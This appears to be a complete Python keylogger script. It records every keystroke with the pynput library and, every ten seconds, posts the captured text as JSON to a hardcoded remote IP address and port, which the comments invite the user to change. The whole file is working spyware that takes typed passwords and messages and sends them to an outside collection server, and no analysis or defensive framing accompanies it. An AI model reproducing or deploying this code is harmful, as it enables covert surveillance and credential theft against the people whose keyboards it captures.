
import json
import threading
from pynput import keyboard
import requests
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Globals
text = ""
text_lock = threading.Lock()  # For thread safety
ip_address = "192.168.80.48"  # Change this
port_number = 8080  # Change this
time_interval = 10
timer = None  # Global reference to the Timer object


def send_post_req():
    global timer, text
    try:
        # Safely access the shared resource
        with text_lock:
            payload = json.dumps({"keyboardData": text})
            text = ""  # Clear the text buffer after sending

        response = requests.post(
            f"http://{ip_address}:{port_number}",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        logging.info(f"Data sent successfully: {payload}")

    except requests.exceptions.RequestException as e:
        logging.error(f"Error sending data: {e}")

    finally:
        # Schedule the next execution
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()


def on_press(key):
    global text
    try:
        with text_lock:  # Ensure thread safety
            if key == keyboard.Key.enter:
                text += "\n"
            elif key == keyboard.Key.tab:
                text += "\t"
            elif key == keyboard.Key.space:
                text += " "
            elif key == keyboard.Key.shift or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass  # Ignore modifier keys
            elif key == keyboard.Key.backspace:
                text = text[:-1] if text else ""
            elif key == keyboard.Key.esc:
                return False  # Stop listener
            else:
                text += str(key).strip("'")
    except Exception as e:
        logging.error(f"Error processing key press: {e}")


def main():
    global timer
    try:
        # Start the periodic request sender
        send_post_req()

        # Start the keyboard listener
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    finally:
        # Ensure timer is canceled on exit
        if timer:
            timer.cancel()


if __name__ == "__main__":
    main()
